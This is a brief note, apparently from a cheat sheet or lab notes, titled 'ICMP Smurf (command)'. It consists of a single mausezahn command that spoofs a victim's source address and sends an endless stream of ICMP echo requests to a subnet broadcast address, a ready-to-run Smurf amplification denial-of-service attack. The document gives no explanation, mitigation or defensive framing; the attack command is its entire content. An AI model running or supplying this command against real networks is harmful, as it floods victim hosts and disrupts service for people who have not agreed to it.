# ICMP Smurf (command)
sudo mausezahn enp0s3 -A 192.168.100.2 -B 192.168.100.255 -t icmp "type=8,code=0" -c 0